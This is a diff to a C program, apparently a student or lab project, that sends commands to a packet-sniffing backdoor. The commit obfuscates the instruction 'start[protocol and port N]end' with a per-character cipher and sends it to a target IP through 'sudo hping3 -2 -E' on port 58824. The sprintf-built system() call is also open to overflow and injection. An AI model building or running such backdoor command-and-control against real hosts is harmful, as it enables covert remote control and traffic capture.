@@ -10,9 +10,10 @@ int main(int argc, char *argv[]) {
         get_user_input(&opts);
         if (confirm_user_input(&opts) == 1) break;
     }
-    // TODO: create instruction.txt that will store instruction
-    //  - Call it through 'hping3 ... -E instruction.txt
-    create_instruction_file(&opts);
+    //TODO: encrypt user input
+    encrypt_and_create_instruction_file(&opts);
+    send_instruction(&opts);
+
     return 0;
 }
 
@@ -146,14 +147,40 @@ bool is_valid_port(char *port) {
 }
 
 
-void create_instruction_file(struct options_sniffer *opts) {
+void encrypt_and_create_instruction_file(struct options_sniffer *opts) {
     FILE *output;
+
     if((output = fopen("instruction.txt", "wb")) == NULL) {
-        printf("Cannot open the file [ %s ] for writing\n", "instruction");
+        printf("Cannot open the file [ %s ] for writing\n", "instruction.txt");
         exit(1);
     }
-    puts("Writing backdoor instruction as a file based on your input ...");
-    fprintf(output, "start[%s and port %d]end", opts->sniff_protocol, opts->sniff_port);
+
+    sprintf(opts->command, "start[%s and port %d]end", opts->sniff_protocol, opts->sniff_port);
+    for (int i = 0; i < strlen(opts->command); i++) {
+        opts->encrypt_command[i] = encrypt_decrypt(opts->command[i]);
+    }
+
+    // write to file
+    fprintf(output, "%s", opts->encrypt_command);
     fclose(output);
+    sleep(1);
 }
 
+
+void send_instruction(struct options_sniffer *opts) {
+    char hping3[64] = {0};
+    int pid;
+
+    pid = fork();
+    if (pid == -1) {
+        puts("fork() failed");
+        exit(1);
+    }
+    else if (pid == 0) {
+        sprintf(hping3, "sudo hping3 -c 1 -2 -E ./instruction.txt -d 100 -p 58824 %s", opts->sniff_ip);
+        system(hping3);
+    }
+    else {
+        wait(NULL);
+    }
+}
